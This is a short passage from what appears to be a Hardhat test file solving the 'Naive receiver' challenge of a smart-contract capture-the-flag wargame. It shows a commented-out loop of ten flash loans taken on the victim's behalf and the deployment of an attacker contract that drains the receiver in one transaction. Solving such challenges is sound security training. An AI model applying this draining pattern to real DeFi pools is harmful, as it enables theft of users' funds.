...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Execution', async function () {
        ...
        // 10 transactions
        // for (let i = 0; i < 10; i++) {
        //     await pool.connect(player).flashLoan(receiver.address, await pool.ETH(), 0, "0x")
        // }

        // 1 transaction
        const attackerContract = await ethers.getContractFactory("AttackNaiveReceiver", player)
        await attackerContract.deploy(pool.address, receiver.address)
    });
